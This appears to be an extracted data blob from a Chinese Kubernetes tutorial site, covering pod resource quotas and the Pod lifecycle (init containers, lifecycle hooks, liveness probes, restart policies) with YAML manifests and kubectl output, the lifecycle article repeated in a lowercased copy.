tcp\n......\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n访问容器中的程序需要使用的是 podip:containerport\n\n\n# 资源配额\n\n容器中的程序要运行，肯定是要占用一定资源的，比如 cpu 和内存等，如果不对某个容器的资源做限制，那么它就可能吃掉大量资源，导致其它容器无法运行。针对这种情况，kubernetes 提供了对内存和 cpu 的资源进行配额的机制，这种机制主要通过 resources 选项实现，他有两个子选项：\n\n * limits：用于限制运行时容器的最大占用资源，当容器占用资源超过 limits 时会被终止，并进行重启\n * requests ：用于设置容器需要的最小资源，如果环境资源不够，容器将无法启动\n\n可以通过上面两个选项设置资源的上下限。当配置了后，会自动去找合适的主机资源来启动 pod\n\n接下来，编写一个测试案例，创建 pod-resources.yaml\n\napiversion: v1\nkind: pod\nmetadata:\n  name: pod-resources\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n    resources: # 资源配额\n      limits:  # 限制资源（上限）\n        cpu: "2" # cpu限制，单位是core数\n        memory: "10gi" # 内存限制\n      requests: # 请求资源（下限）\n        cpu: "1"  # cpu限制，单位是core数\n        memory: "10mi"  # 内存限制\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n在这对 cpu 和 memory 的单位做一个说明：\n\n * cpu：core 数，可以为整数或小数\n * memory： 内存大小，可以使用 gi、mi、g、m 等形式\n\n# 运行pod\n[root@k8s-master01 ~]# kubectl create  -f pod-resources.yaml\npod/pod-resources created\n\n# 查看发现pod运行正常\n[root@k8s-master01 ~]# kubectl get pod pod-resources -n dev\nname            ready   status    restarts   age  \npod-resources   1/1     running   0          39s   \n\n# 接下来，停止pod\n[root@k8s-master01 ~]# kubectl delete  -f pod-resources.yaml\npod "pod-resources" deleted\n\n# 编辑pod，修改resources.requests.memory的值为10gi\n[root@k8s-master01 ~]# vim pod-resources.yaml\n\n# 再次启动pod\n[root@k8s-master01 ~]# kubectl create  -f pod-resources.yaml\npod/pod-resources created\n\n# 查看pod状态，发现pod启动失败\n[root@k8s-master01 ~]# kubectl get pod pod-resources -n dev -o wide\nname            ready   status    restarts   age          \npod-resources   0/1     pending   0          20s    \n\n# 查看pod详情会发现，如下提示\n[root@k8s-master01 ~]# kubectl describe pod pod-resources -n dev\n......\nwarning  failedscheduling  35s   default-scheduler  0/3 nodes are available: 1 node(s) had taint {node-role.kubernetes.io/master: }, that the pod didn\'t tolerate, 2 insufficient memory.(内存不足)\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n',charsets:{cjk:!0}},{title:"kubernetes(六) Pod 生命周期",frontmatter:{title:"kubernetes(六) Pod 生命周期",date:"2023-06-25T09:22:36.000Z",permalink:"/kubernetes/605",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/04.%E8%BF%90%E7%BB%B4/60.Kubernetes/605.kubernetes(%E5%85%AD)%20Pod%20%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F.html",relativePath:"04.运维/60.Kubernetes/605.kubernetes(六) Pod 生命周期.md",key:"v-c4504aa6",path:"/kubernetes/605/",headers:[{level:2,title:"概述",slug:"概述",normalizedTitle:"概述",charIndex:2},{level:2,title:"钩子函数",slug:"钩子函数",normalizedTitle:"钩子函数",charIndex:3842},{level:2,title:"容器探测",slug:"容器探测",normalizedTitle:"容器探测",charIndex:5547},{level:2,title:"重启策略",slug:"重启策略",normalizedTitle:"重启策略",charIndex:7477}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"概述 钩子函数 容器探测 重启策略",content:'# 概述\n\n我们一般将 Pod 对象从创建至终的这段时间范围称为 Pod 的生命周期，它主要包含下面的过程：\n\n * Pod 创建过程\n * 运行初始化容器（init container）过程\n * 运行主容器（main container）过程\n   * 容器启动后钩子（post start）、容器终止前钩子（pre stop）\n     - 容器的存活性探测（liveness probe）、就绪性探测（readiness probe）\n * pod 终止过程\n\n\n\n在整个生命周期中，Pod 会出现 5 中状态，分别如下：\n\n * 挂起（Pending）：apiserver 已经创建了 pod 资源对象，但它尚未被调度完成或者仍处于下载镜像的过程中\n * 运行中（Running）：pod 已经被调度至某节点，并且所有容器都已经被 kubelet 创建完成\n * 成功（Successded）：pod 中的所有容器都已经成功终止并且不会被重启\n * 失败（Failed）：所有容器都已经终止，但至少有一个容器终止失败，即容器返回了非 0 值得退出状态\n * 未知（Unknown）：apiserver 无法正常获取到 pod 对象的状态信息，通常由网络通信失败所导致\n\n\n# 创建和终止\n\npod 的创建过程\n\n 1. 用户通过 kubectl 或其他 api 客户端提交需要创建的 pod 信息给 apiServer\n 2. apiServer 开始生成 pod 对象的信息，并将信息存入 etcd，然后返回确认信息至客户端\n 3. apiServer 开始反映 etcd 中的 pod 对象的变化，其它组件使用 watch 机制来跟踪检查 apiServer 上的变动\n 4. scheduler 发现有新的 pod 对象要创建，开始为 Pod 分配主机并将结果信息更新至 apiServer\n 5. node 节点上的 kubelet 发现有 pod 调度过来，尝试调用 docker 启动容器，并将结果回送至 apiServer\n 6. apiServer 将接收到的 pod 状态信息存入 etcd 中\n\n\n\npod 的终止过程\n\n 1. 用户向 apiServer 发送删除 pod 对象的命令\n 2. apiServcer 中的 pod 对象信息会随着时间的推移而更新，在宽限期内（默认 30s），pod 被视为 dead\n 3. 将 pod 标记为 terminating 状态\n 4. kubelet 在监控到 pod 对象转为 terminating 状态的同时启动 pod 关闭过程\n 5. 端点控制器监控到 pod 对象的关闭行为时将其从所有匹配到此端点的 service 资源的端点列表中移除\n 6. 如果当前 pod 对象定义了 preStop 钩子处理器，则在其标记为 terminating 后即会以同步的方式启动执行\n 7. pod 对象中的容器进程收到停止信号\n 8. 宽限期结束后，若 pod 中还存在仍在运行的进程，那么 pod 对象会收到立即终止的信号\n 9. kubelet 请求 apiServer 将此 pod 资源的宽限期设置为 0 从而完成删除操作，此时 pod 对于用户已不可见\n\n\n# 初始化和容器\n\n初始化容器是在 pod 的主容器启动之前要运行的容器，主要是做一些主容器的前置工作，它具有两大特征：\n\n 1. 初始化容器必须运行完成直至结束，若某初始化容器运行失败，那么 kubernetes 需要重启它直到成功完成\n 2. 初始化容器必须按照定义的顺序执行，当且仅当前一个成功之后，后面的一个才能运行\n\n初始化容器有很多的应用场景，下面列出的是最常见的几个：\n\n * 提供主容器镜像中不具备的工具程序或自定义代码\n * 初始化容器要先于应用容器串行启动并运行完成，因此可用于延后应用容器的启动直至其依赖的条件得到满足\n\n假设要以主容器来运行 nginx，但是要求在运行 nginx 之前先要能够连接上相应的服务器是可以 ping 通的。\n创建 pod-initcontainer.yaml，内容如下：\n\napiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-initcontainer\n  namespace: dev\nspec:\n  containers:\n  - name: main-container\n    image: nginx:1.17.1\n    ports: \n    - name: nginx-port\n      containerPort: 80\n  # 初始化容器\n  initContainers:\n  # 模拟mysql连接\n  - name: test-mysql\n    image: busybox:1.30\n    command: [\'sh\', \'-c\', \'until ping 192.168.81.102 -c 1 ; do echo waiting for mysql...; sleep 2; done;\']、\n  # 模拟redis连接\n  - name: test-redis\n    image: busybox:1.30\n    command: [\'sh\', \'-c\', \'until ping 192.168.81.103 -c 1 ; do echo waiting for reids...; sleep 2; done;\']\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n\n# 创建pod\n[root@k8s-master01 ~]# kubectl create -f pod-initcontainer.yaml\npod/pod-initcontainer created\n\n# 查看pod状态\n# 发现pod卡在启动第一个初始化容器过程中，后面的容器不会运行\nroot@k8s-master01 ~]# kubectl describe pod  pod-initcontainer -n dev\n........\nEvents:\n  Type    Reason     Age   From               Message\n  ----    ------     ----  ----               -------\n  Normal  Scheduled  49s   default-scheduler  Successfully assigned dev/pod-initcontainer to node1\n  Normal  Pulled     48s   kubelet, node1     Container image "busybox:1.30" already present on machine\n  Normal  Created    48s   kubelet, node1     Created container test-mysql\n  Normal  Started    48s   kubelet, node1     Started container test-mysql\n\n# 动态查看pod\n[root@k8s-master01 ~]# kubectl get pods pod-initcontainer -n dev -w\nNAME                             READY   STATUS     RESTARTS   AGE\npod-initcontainer                0/1     Init:0/2   0          15s\npod-initcontainer                0/1     Init:1/2   0          52s\npod-initcontainer                0/1     Init:1/2   0          53s\npod-initcontainer                0/1     PodInitializing   0          89s\npod-initcontainer                1/1     Running           0          90s\n\n# 接下来新开一个shell，为当前服务器新增两个ip，观察pod的变化，为网卡添加地址\n[root@k8s-master01 ~]# ifconfig ens33:1 192.168.81.102 netmask 255.255.255.0 up\n[root@k8s-master01 ~]# ifconfig ens33:2 192.168.81.103 netmask 255.255.255.0 up\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n\n\n\n# 钩子函数\n\n钩子函数能够感知自身生命周期中的事件，并在相应的时刻到来时运行用户指定的程序代码。\n\nkubernetes 在主容器的启动之后和停止之前提供了两个钩子函数：\n\n * post start：容器创建之后执行，如果失败了会重启容器\n * pre stop ：容器终止之前执行，执行完成之后容器将成功终止，在其完成之前会阻塞删除容器的操作\n\n钩子处理器支持使用下面三种方式定义动作：\n\n * Exec 命令：在容器内执行一次命令\n\n……\n  lifecycle:\n    postStart: \n      exec:\n        command:\n        - cat\n        - /tmp/healthy\n……\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n * TCPSocket：在当前容器尝试访问指定的 socket\n\n……      \n  lifecycle:\n    postStart:\n      tcpSocket:\n        port: 8080\n……\n\n\n1\n2\n3\n4\n5\n6\n\n * HTTPGet：在当前容器中向某 url 发起 http 请求\n\n……\n  lifecycle:\n    postStart:\n      httpGet:\n        path: / #URI地址\n        port: 80 #端口号\n        host: 192.168.5.3 #主机地址\n        scheme: HTTP #支持的协议，http或者https\n……\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n接下来，以 exec 方式为例，演示下钩子函数的使用，创建 pod-hook-exec.yaml 文件，内容如下：\n\napiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-hook-exec\n  namespace: dev\nspec:\n  containers:\n  - name: main-container\n    image: nginx:1.17.1\n    ports:\n    - name: nginx-port\n      containerPort: 80\n    # 生命周期\n    lifecycle:\n      postStart: \n        exec: # 在容器启动的时候执行一个命令，修改掉nginx的默认首页内容\n          command: ["/bin/sh", "-c", "echo postStart... > /usr/share/nginx/html/index.html"]\n      preStop:\n        exec: # 在容器停止之前停止nginx服务\n          command: ["/usr/sbin/nginx","-s","quit"]\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n# 创建pod\n[root@k8s-master01 ~]# kubectl create -f pod-hook-exec.yaml\npod/pod-hook-exec created\n\n# 查看pod\n[root@k8s-master01 ~]# kubectl get pods  pod-hook-exec -n dev -o wide\nNAME           READY   STATUS     RESTARTS   AGE    IP            NODE    \npod-hook-exec  1/1     Running    0          29s    10.244.2.48   node2   \n\n# 访问pod\n[root@k8s-master01 ~]# curl 10.244.2.48\npostStart...\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n\n# 容器探测\n\n容器探测用于检测容器中的应用实例是否正常工作，是保障业务可用性的一种传统机制。如果经过探测，实例的状态不符合预期，那么 kubernetes 就会把该问题实例 "摘除"，不承担业务流量。kubernetes 提供了两种探针来实现容器探测，分别是：\n\n * liveness probes：存活性探针，用于检测应用实例当前是否处于正常运行状态，如果不是，k8s 会重启容器\n * readiness probes：就绪性探针，用于检测应用实例当前是否可以接收请求，如果不能，k8s 不会转发流量\n\n> livenessProbe 决定是否重启容器，readinessProbe 决定是否将请求转发给容器。\n\n上面两种探针目前均支持三种探测方式：\n\n * Exec 命令：在容器内执行一次命令，如果命令执行的退出码为 0，则认为程序正常，否则不正常\n\n……\n  livenessProbe:\n    exec:\n      command:\n      - cat\n      - /tmp/healthy\n……\n\n\n1\n2\n3\n4\n5\n6\n7\n\n * TCPSocket：将会尝试访问一个用户容器的端口，如果能够建立这条连接，则认为程序正常，否则不正常\n\n……      \n  livenessProbe:\n    tcpSocket:\n      port: 8080\n……\n\n\n1\n2\n3\n4\n5\n\n * HTTPGet：调用容器内 Web 应用的 URL，如果返回的状态码在 200 和 399 之间，则认为程序正常，否则不正常\n\n……\n  livenessProbe:\n    httpGet:\n      path: / #URI地址\n      port: 80 #端口号\n      host: 127.0.0.1 #主机地址\n      scheme: HTTP #支持的协议，http或者https\n……\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n下面以 liveness probes 为例，做几个演示：\n方式一：Exec\n创建 pod-liveness-exec.yaml\n\napiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-liveness-exec\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n    ports: \n    - name: nginx-port\n      containerPort: 80\n    livenessProbe:\n      exec:\n        command: ["/bin/cat","/tmp/hello.txt"] # 执行一个查看文件的命令\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n创建 pod，观察效果\n\n# 创建Pod\n[root@k8s-master01 ~]# kubectl create -f pod-liveness-exec.yaml\npod/pod-liveness-exec created\n\n# 查看Pod详情\n[root@k8s-master01 ~]# kubectl describe pods pod-liveness-exec -n dev\n......\n  Normal   Created    20s (x2 over 50s)  kubelet, node1     Created container nginx\n  Normal   Started    20s (x2 over 50s)  kubelet, node1     Started container nginx\n  Normal   Killing    20s                kubelet, node1     Container nginx failed liveness probe, will be restarted\n  Warning  Unhealthy  0s (x5 over 40s)   kubelet, node1     Liveness probe failed: cat: can\'t open \'/tmp/hello11.txt\': No such file or directory\n  \n# 观察上面的信息就会发现nginx容器启动之后就进行了健康检查\n# 检查失败之后，容器被kill掉，然后尝试进行重启（这是重启策略的作用，后面讲解）\n# 稍等一会之后，再观察pod信息，就可以看到RESTARTS不再是0，而是一直增长\n[root@k8s-master01 ~]# kubectl get pods pod-liveness-exec -n dev\nNAME                READY   STATUS             RESTARTS   AGE\npod-liveness-exec   0/1     CrashLoopBackOff   2          3m19s\n\n# 当然接下来，可以修改成一个存在的文件，比如/tmp/hello.txt，再试，结果就正常了......\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n方式二：TCPSocket\n创建 pod-liveness-tcpsocket.yaml\n\napiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-liveness-tcpsocket\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n    ports: \n    - name: nginx-port\n      containerPort: 80\n    livenessProbe:\n      tcpSocket:\n        port: 8080 # 尝试访问8080端口\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n创建 pod，观察效果\n\n# 创建Pod\n[root@k8s-master01 ~]# kubectl create -f pod-liveness-tcpsocket.yaml\npod/pod-liveness-tcpsocket created\n\n# 查看Pod详情\n[root@k8s-master01 ~]# kubectl describe pods pod-liveness-tcpsocket -n dev\n......\n  Normal   Scheduled  31s                            default-scheduler  Successfully assigned dev/pod-liveness-tcpsocket to node2\n  Normal   Pulled     <invalid>                      kubelet, node2     Container image "nginx:1.17.1" already present on machine\n  Normal   Created    <invalid>                      kubelet, node2     Created container nginx\n  Normal   Started    <invalid>                      kubelet, node2     Started container nginx\n  Warning  Unhealthy  <invalid> (x2 over <invalid>)  kubelet, node2     Liveness probe failed: dial tcp 10.244.2.44:8080: connect: connection refused\n  \n# 观察上面的信息，发现尝试访问8080端口,但是失败了\n# 稍等一会之后，再观察pod信息，就可以看到RESTARTS不再是0，而是一直增长\n[root@k8s-master01 ~]# kubectl get pods pod-liveness-tcpsocket  -n dev\nNAME                     READY   STATUS             RESTARTS   AGE\npod-liveness-tcpsocket   0/1     CrashLoopBackOff   2          3m19s\n\n# 当然接下来，可以修改成一个可以访问的端口，比如80，再试，结果就正常了......\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n方式三：HTTPGet\n创建 pod-liveness-httpget.yaml\n\napiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-liveness-httpget\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n    ports:\n    - name: nginx-port\n      containerPort: 80\n    livenessProbe:\n      httpGet:  # 其实就是访问http://127.0.0.1:80/hello  \n        scheme: HTTP #支持的协议，http或者https\n        port: 80 #端口号\n        path: /hello #URI地址\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n创建 pod，观察效果\n\n# 创建Pod\n[root@k8s-master01 ~]# kubectl create -f pod-liveness-httpget.yaml\npod/pod-liveness-httpget created\n\n# 查看Pod详情\n[root@k8s-master01 ~]# kubectl describe pod pod-liveness-httpget -n dev\n.......\n  Normal   Pulled     6s (x3 over 64s)  kubelet, node1     Container image "nginx:1.17.1" already present on machine\n  Normal   Created    6s (x3 over 64s)  kubelet, node1     Created container nginx\n  Normal   Started    6s (x3 over 63s)  kubelet, node1     Started container nginx\n  Warning  Unhealthy  6s (x6 over 56s)  kubelet, node1     Liveness probe failed: HTTP probe failed with statuscode: 404\n  Normal   Killing    6s (x2 over 36s)  kubelet, node1     Container nginx failed liveness probe, will be restarted\n  \n# 观察上面信息，尝试访问路径，但是未找到,出现404错误\n# 稍等一会之后，再观察pod信息，就可以看到RESTARTS不再是0，而是一直增长\n[root@k8s-master01 ~]# kubectl get pod pod-liveness-httpget -n dev\nNAME                   READY   STATUS    RESTARTS   AGE\npod-liveness-httpget   1/1     Running   5          3m17s\n\n# 当然接下来，可以修改成一个可以访问的路径path，比如/，再试，结果就正常了......\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n至此，已经使用 liveness Probe 演示了三种探测方式，但是查看 livenessProbe 的子属性，会发现除了这三种方式，还有一些其他的配置，在这里一并解释下：\n\n[root@k8s-master01 ~]# kubectl explain pod.spec.containers.livenessProbe\nFIELDS:\n   exec <Object>  \n   tcpSocket    <Object>\n   httpGet      <Object>\n   initialDelaySeconds  <integer>  # 容器启动后等待多少秒执行第一次探测\n   timeoutSeconds       <integer>  # 探测超时时间。默认1秒，最小1秒\n   periodSeconds        <integer>  # 执行探测的频率。默认是10秒，最小1秒\n   failureThreshold     <integer>  # 连续探测失败多少次才被认定为失败。默认是3。最小值是1\n   successThreshold     <integer>  # 连续探测成功多少次才被认定为成功。默认是1\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n * initialDelaySeconds 容器启动后等待多少秒执行第一次探测\n * timeoutSeconds 探测超时时间。默认 1 秒，最小 1 秒\n * periodSeconds 执行探测的频率。默认是 10 秒，最小 1 秒\n * failureThreshold 连续探测失败多少次才被认定为失败。默认是 3。最小值是 1\n * successThreshold 连续探测成功多少次才被认定为成功。默认是 1\n\n下面稍微配置两个，演示下效果即可：\n\n[root@k8s-master01 ~]# more pod-liveness-httpget.yaml\napiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-liveness-httpget\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n    ports:\n    - name: nginx-port\n      containerPort: 80\n    livenessProbe:\n      httpGet:\n        scheme: HTTP\n        port: 80 \n        path: /\n      initialDelaySeconds: 30 # 容器启动后30s开始探测\n      timeoutSeconds: 5 # 探测超时时间为5s\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n\n# 重启策略\n\n一旦容器探测出现了问题，kubernetes 就会对容器所在的 Pod 进行重启，其实这是由 pod 的重启策略决定的，pod 的重启策略有 3 种，分别如下：\n\n * Always ：容器失效时，自动重启该容器，这也是默认值。\n * OnFailure ： 容器终止运行且退出码不为 0 时重启\n * Never ： 不论状态为何，都不重启该容器\n\n重启策略适用于 pod 对象中的所有容器，首次需要重启的容器，将在其需要时立即进行重启，随后再次需要重启的操作将由 kubelet 延迟一段时间后进行，且反复的重启操作的延迟时长以此为 10s、20s、40s、80s、160s 和 300s，300s 是最大延迟时长。\n\n创建 pod-restartpolicy.yaml：\n\napiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-restartpolicy\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n    ports:\n    - name: nginx-port\n      containerPort: 80\n    livenessProbe:\n      httpGet:\n        scheme: HTTP\n        port: 80\n        path: /hello\n  restartPolicy: Never # 设置重启策略为Never\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n运行 Pod 测试\n\n# 创建Pod\n[root@k8s-master01 ~]# kubectl create -f pod-restartpolicy.yaml\npod/pod-restartpolicy created\n\n# 查看Pod详情，发现nginx容器失败\n[root@k8s-master01 ~]# kubectl  describe pods pod-restartpolicy  -n dev\n......\n  Warning  Unhealthy  15s (x3 over 35s)  kubelet, node1     Liveness probe failed: HTTP probe failed with statuscode: 404\n  Normal   Killing    15s                kubelet, node1     Container nginx failed liveness probe\n  \n# 多等一会，再观察pod的重启次数，发现一直是0，并未重启   \n[root@k8s-master01 ~]# kubectl  get pods pod-restartpolicy -n dev\nNAME                   READY   STATUS    RESTARTS   AGE\npod-restartpolicy      0/1     Running   0          5min42s\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n',normalizedContent:'# 概述\n\n我们一般将 pod 对象从创建至终的这段时间范围称为 pod 的生命周期，它主要包含下面的过程：\n\n * pod 创建过程\n * 运行初始化容器（init container）过程\n * 运行主容器（main container）过程\n   * 容器启动后钩子（post start）、容器终止前钩子（pre stop）\n     - 容器的存活性探测（liveness probe）、就绪性探测（readiness probe）\n * pod 终止过程\n\n\n\n在整个生命周期中，pod 会出现 5 中状态，分别如下：\n\n * 挂起（pending）：apiserver 已经创建了 pod 资源对象，但它尚未被调度完成或者仍处于下载镜像的过程中\n * 运行中（running）：pod 已经被调度至某节点，并且所有容器都已经被 kubelet 创建完成\n * 成功（successded）：pod 中的所有容器都已经成功终止并且不会被重启\n * 失败（failed）：所有容器都已经终止，但至少有一个容器终止失败，即容器返回了非 0 值得退出状态\n * 未知（unknown）：apiserver 无法正常获取到 pod 对象的状态信息，通常由网络通信失败所导致\n\n\n# 创建和终止\n\npod 的创建过程\n\n 1. 用户通过 kubectl 或其他 api 客户端提交需要创建的 pod 信息给 apiserver\n 2. apiserver 开始生成 pod 对象的信息，并将信息存入 etcd，然后返回确认信息至客户端\n 3. apiserver 开始反映 etcd 中的 pod 对象的变化，其它组件使用 watch 机制来跟踪检查 apiserver 上的变动\n 4. scheduler 发现有新的 pod 对象要创建，开始为 pod 分配主机并将结果信息更新至 apiserver\n 5. node 节点上的 kubelet 发现有 pod 调度过来，尝试调用 docker 启动容器，并将结果回送至 apiserver\n 6. apiserver 将接收到的 pod 状态信息存入 etcd 中\n\n\n\npod 的终止过程\n\n 1. 用户向 apiserver 发送删除 pod 对象的命令\n 2. apiservcer 中的 pod 对象信息会随着时间的推移而更新，在宽限期内（默认 30s），pod 被视为 dead\n 3. 将 pod 标记为 terminating 状态\n 4. kubelet 在监控到 pod 对象转为 terminating 状态的同时启动 pod 关闭过程\n 5. 端点控制器监控到 pod 对象的关闭行为时将其从所有匹配到此端点的 service 资源的端点列表中移除\n 6. 如果当前 pod 对象定义了 prestop 钩子处理器，则在其标记为 terminating 后即会以同步的方式启动执行\n 7. pod 对象中的容器进程收到停止信号\n 8. 宽限期结束后，若 pod 中还存在仍在运行的进程，那么 pod 对象会收到立即终止的信号\n 9. kubelet 请求 apiserver 将此 pod 资源的宽限期设置为 0 从而完成删除操作，此时 pod 对于用户已不可见\n\n\n# 初始化和容器\n\n初始化容器是在 pod 的主容器启动之前要运行的容器，主要是做一些主容器的前置工作，它具有两大特征：\n\n 1. 初始化容器必须运行完成直至结束，若某初始化容器运行失败，那么 kubernetes 需要重启它直到成功完成\n 2. 初始化容器必须按照定义的顺序执行，当且仅当前一个成功之后，后面的一个才能运行\n\n初始化容器有很多的应用场景，下面列出的是最常见的几个：\n\n * 提供主容器镜像中不具备的工具程序或自定义代码\n * 初始化容器要先于应用容器串行启动并运行完成，因此可用于延后应用容器的启动直至其依赖的条件得到满足\n\n假设要以主容器来运行 nginx，但是要求在运行 nginx 之前先要能够连接上相应的服务器是可以 ping 通的。\n创建 pod-initcontainer.yaml，内容如下：\n\napiversion: v1\nkind: pod\nmetadata:\n  name: pod-initcontainer\n  namespace: dev\nspec:\n  containers:\n  - name: main-container\n    image: nginx:1.17.1\n    ports: \n    - name: nginx-port\n      containerport: 80\n  # 初始化容器\n  initcontainers:\n  # 模拟mysql连接\n  - name: test-mysql\n    image: busybox:1.30\n    command: [\'sh\', \'-c\', \'until ping 192.168.81.102 -c 1 ; do echo waiting for mysql...; sleep 2; done;\']、\n  # 模拟redis连接\n  - name: test-redis\n    image: busybox:1.30\n    command: [\'sh\', \'-c\', \'until ping 192.168.81.103 -c 1 ; do echo waiting for reids...; sleep 2; done;\']\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n\n# 创建pod\n[root@k8s-master01 ~]# kubectl create -f pod-initcontainer.yaml\npod/pod-initcontainer created\n\n# 查看pod状态\n# 发现pod卡在启动第一个初始化容器过程中，后面的容器不会运行\nroot@k8s-master01 ~]# kubectl describe pod  pod-initcontainer -n dev\n........\nevents:\n  type    reason     age   from               message\n  ----    ------     ----  ----               -------\n  normal  scheduled  49s   default-scheduler  successfully assigned dev/pod-initcontainer to node1\n  normal  pulled     48s   kubelet, node1     container image "busybox:1.30" already present on machine\n  normal  created    48s   kubelet, node1     created container test-mysql\n  normal  started    48s   kubelet, node1     started container test-mysql\n\n# 动态查看pod\n[root@k8s-master01 ~]# kubectl get pods pod-initcontainer -n dev -w\nname                             ready   status     restarts   age\npod-initcontainer                0/1     init:0/2   0          15s\npod-initcontainer                0/1     init:1/2   0          52s\npod-initcontainer                0/1     init:1/2   0          53s\npod-initcontainer                0/1     podinitializing   0          89s\npod-initcontainer                1/1     running           0          90s\n\n# 接下来新开一个shell，为当前服务器新增两个ip，观察pod的变化，为网卡添加地址\n[root@k8s-master01 ~]# ifconfig ens33:1 192.168.81.102 netmask 255.255.255.0 up\n[root@k8s-master01 ~]# ifconfig ens33:2 192.168.81.103 netmask 255.255.255.0 up\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n\n\n\n# 钩子函数\n\n钩子函数能够感知自身生命周期中的事件，并在相应的时刻到来时运行用户指定的程序代码。\n\nkubernetes 在主容器的启动之后和停止之前提供了两个钩子函数：\n\n * post start：容器创建之后执行，如果失败了会重启容器\n * pre stop ：容器终止之前执行，执行完成之后容器将成功终止，在其完成之前会阻塞删除容器的操作\n\n钩子处理器支持使用下面三种方式定义动作：\n\n * exec 命令：在容器内执行一次命令\n\n……\n  lifecycle:\n    poststart: \n      exec:\n        command:\n        - cat\n        - /tmp/healthy\n……\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n * tcpsocket：在当前容器尝试访问指定的 socket\n\n……      \n  lifecycle:\n    poststart:\n      tcpsocket:\n        port: 8080\n……\n\n\n1\n2\n3\n4\n5\n6\n\n * httpget：在当前容器中向某 url 发起 http 请求\n\n……\n  lifecycle:\n    poststart:\n      httpget:\n        path: / #uri地址\n        port: 80 #端口号\n        host: 192.168.5.3 #主机地址\n        scheme: http #支持的协议，http或者https\n……\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n接下来，以 exec 方式为例，演示下钩子函数的使用，创建 pod-hook-exec.yaml 文件，内容如下：\n\napiversion: v1\nkind: pod\nmetadata:\n  name: pod-hook-exec\n  namespace: dev\nspec:\n  containers:\n  - name: main-container\n    image: nginx:1.17.1\n    ports:\n    - name: nginx-port\n      containerport: 80\n    # 生命周期\n    lifecycle:\n      poststart: \n        exec: # 在容器启动的时候执行一个命令，修改掉nginx的默认首页内容\n          command: ["/bin/sh", "-c", "echo poststart... > /usr/share/nginx/html/index.html"]\n      prestop:\n        exec: # 在容器停止之前停止nginx服务\n          command: ["/usr/sbin/nginx","-s","quit"]\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n# 创建pod\n[root@k8s-master01 ~]# kubectl create -f pod-hook-exec.yaml\npod/pod-hook-exec created\n\n# 查看pod\n[root@k8s-master01 ~]# kubectl get pods  pod-hook-exec -n dev -o wide\nname           ready   status     restarts   age    ip            node    \npod-hook-exec  1/1     running    0          29s    10.244.2.48   node2   \n\n# 访问pod\n[root@k8s-master01 ~]# curl 10.244.2.48\npoststart...\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n\n# 容器探测\n\n容器探测用于检测容器中的应用实例是否正常工作，是保障业务可用性的一种传统机制。如果经过探测，实例的状态不符合预期，那么 kubernetes 就会把该问题实例 "摘除"，不承担业务流量。kubernetes 提供了两种探针来实现容器探测，分别是：\n\n * 